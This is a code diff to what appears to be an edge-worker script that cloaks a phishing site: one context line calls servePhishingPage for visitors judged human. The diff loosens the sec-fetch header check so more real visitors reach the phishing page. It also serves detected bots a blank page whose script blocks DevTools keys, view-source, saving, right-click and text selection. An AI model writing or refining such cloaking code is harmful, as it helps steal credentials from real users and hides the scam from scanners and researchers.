@@ -113,7 +113,15 @@ function isBotRequest(request) {
   }
   
   // Check for missing sec-fetch headers (modern browsers always send these)
-  if (!secFetchSite || !secFetchMode || !secFetchDest) {
+  // But be lenient - some browsers/CDNs don't send sec-fetch headers
+  // Only block if multiple browser headers are missing
+  let missingHeaders = 0;
+  if (!secFetchSite) missingHeaders++;
+  if (!secFetchMode) missingHeaders++;
+  if (!secFetchDest) missingHeaders++;
+  
+  // Only block if 2+ sec-fetch headers are missing (real browsers send all 3)
+  if (missingHeaders >= 2) {
     return { isBot: true, reason: 'missing_sec_fetch' };
   }
   
@@ -167,13 +175,15 @@ async function handleRequest(request) {
       return servePhishingPage(request);
     }
   } else {
-    // Bot detected - return white page immediately
+    // Bot detected - return white page with anti-scraping protection
     console.log('[Worker] Bot blocked:', botCheck.reason, botCheck.signature || '');
-    return new Response('', {
+    const whitePage = `<!DOCTYPE html><html><head><meta charset="UTF-8"><style>body{margin:0;padding:0;background:#fff;overflow:hidden;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}</style><script>document.addEventListener('keydown',function(e){if(e.ctrlKey||e.metaKey){e.preventDefault();e.stopPropagation()}if(e.key==='F12'||e.key==='F12'){e.preventDefault()}if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i')){e.preventDefault()}if(e.ctrlKey&&e.key==='u'){e.preventDefault()}if(e.ctrlKey&&e.key==='s'){e.preventDefault()}if(e.ctrlKey&&e.key==='p'){e.preventDefault()}});document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('selectstart',function(e){e.preventDefault()})<\/script></head><body></body></html>`;
+    return new Response(whitePage, {
       status: 200,
       headers: {
         'Content-Type': 'text/html; charset=utf-8',
         'Cache-Control': 'no-cache, no-store, must-revalidate',
+        'X-Content-Type-Options': 'nosniff',
       }
     });
   }
